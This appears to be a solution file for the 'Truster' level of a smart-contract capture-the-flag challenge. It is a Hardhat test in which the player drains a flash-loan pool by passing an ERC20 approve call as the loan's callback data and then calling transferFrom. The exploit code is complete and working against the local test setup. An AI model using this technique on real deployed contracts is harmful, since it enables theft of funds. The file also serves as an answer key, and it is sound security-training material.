const { ethers } = require('hardhat');
const { expect } = require('chai');
const { abi } = require('../../artifacts/solmate/src/tokens/ERC20.sol/ERC20.json');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // somehow we need to obtain ownership of all the tokens 
        // without paying them back.

        const tokenInterface = new ethers.utils.Interface(abi);

        // The repay fx is not going to actually repay the loan
        // but to approve the attacker to spend the tokens via ERC20 approve function

        const calldata = tokenInterface.encodeFunctionData('approve', [player.address, TOKENS_IN_POOL])
        console.log({ calldata })

        console.log("Interface: ", tokenInterface.functions)

        console.log("Truster lender pool address: ", pool.address);

        // we need to call the flashLoan function from the pool contract
        // the check in TrusterLenderPool will pass because we are only approving, not transfering the tokens
        await pool.connect(player).flashLoan(0, player.address, token.address, calldata);

        // Later we can just withdraw the tokens from the pool 
        // since they were approved to be spent by the attacker

        console.table({ allowance: ethers.utils.formatUnits(await token.allowance(pool.address, player.address), 18) })

        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

